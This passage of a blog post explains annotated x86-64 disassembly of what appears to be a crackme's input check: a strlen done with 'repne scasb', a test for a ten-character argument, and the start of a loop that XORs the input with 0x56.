&lt;code&gt;repne scasb&lt;/code&gt; will scan the string in &lt;code&gt;di/edi/rdi&lt;/code&gt; for the byte (&lt;code&gt;scasb&lt;/code&gt; is the byte version of &lt;code&gt;scas&lt;/code&gt; instruction) in &lt;code&gt;ax/eax/rax&lt;/code&gt; and decrease &lt;code&gt;cx/ecx/rcx&lt;/code&gt; by one after each execution. It stops if &lt;code&gt;cx/ecx/rcx&lt;/code&gt; reaches zero or if a match is found.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;strlen&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_3C0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_3C8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0FFFFFFFFFFFFFFFFh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rdx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;          &lt;span style=&#34;color: #586E75&#34;&gt;; null terminator&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_3C8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; 0FFFFFFFFFFFFFFFFh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rdi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rdx&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; rdi = arg1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;repne&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;scasb&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; searching for null terminator&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FA&lt;/span&gt;                         &lt;span style=&#34;color: #586E75&#34;&gt;; in other words strlen&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rcx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004370&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;FF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;not&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437102&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437106&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0Ah&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; if ( strlen(arg1) == 10 ) jump&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043710&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;strlen_arg1_equals_10&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Null terminator or &lt;code&gt;0x00&lt;/code&gt; is saved in eax in line 6. Line 7 has &lt;code&gt;rcx&lt;/code&gt;. We don&amp;rsquo;t want &lt;code&gt;rcx&lt;/code&gt; to reach zero before the end of the string. First argument is saved in &lt;code&gt;rdi&lt;/code&gt; in line 8 and finally line 9 calls &lt;code&gt;repne scasb&lt;/code&gt;. This is basically &lt;code&gt;strlen(arg1)&lt;/code&gt;. In line 14, it is checked if the length of first argument is 10. If so we will jump.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;strlen_arg1_equals_10&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437120&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;strlen_arg1_equals_10:&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; strlen(arg1) == 10 Decimal&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437120&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_3C0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437127&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043712&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;           &lt;span style=&#34;color: #586E75&#34;&gt;; rax = arg1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043712&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rdi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; rdi = arg1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437131&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_468BB0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437136&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;arg1_2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; rax = arg1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043713&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;counter_?&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437147&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_437177&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We can see that arg1 is saved to &lt;code&gt;rdi&lt;/code&gt; in line 5 and &lt;code&gt;sub_468BB0&lt;/code&gt; is called. We can get inside &lt;code&gt;sub_468BB0&lt;/code&gt; but it is basically &lt;code&gt;malloc&lt;/code&gt;. It allocates a string and initializes it with first argument. Return value is in &lt;code&gt;rax&lt;/code&gt; which is a pointer to the newly created string. It is saved to &lt;code&gt;[rbp+arg1_2]&lt;/code&gt; (I have renamed the variables). Finally there is an unconditional jump.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;loc_437177&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437177&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;loc_437177:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437177&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;counter_?&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043717&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movsxd&lt;/span&gt;  &lt;span style=&#34;color: #B58900&#34;&gt;rsi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437180&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_3C0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437187&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043718&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; rax = arg1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043718&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_3C8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0FFFFFFFFFFFFFFFFh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437199&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rdx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043719&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rcx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_3C8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rdi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rdx&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; rdi = arg1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;AB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;repne&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;scasb&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; strlen(arg1)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;AD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rcx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;not&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rsi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; check if counter &amp;lt; 11&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;setb&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00000000004371&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;arg1_xor_0x56&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; if counter &amp;lt; 11 jump to for&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437149&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for_arg1_xor_0x56&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437149&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;counter_?&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043714&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cdqe&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437151&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;rax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;arg1_2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0000000000437158&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;rbp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;counter_?&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:000000000043715&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movsxd&lt;/span&gt;  &lt;span style=&#34;color: #B58900&#34;&gt;rdx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;
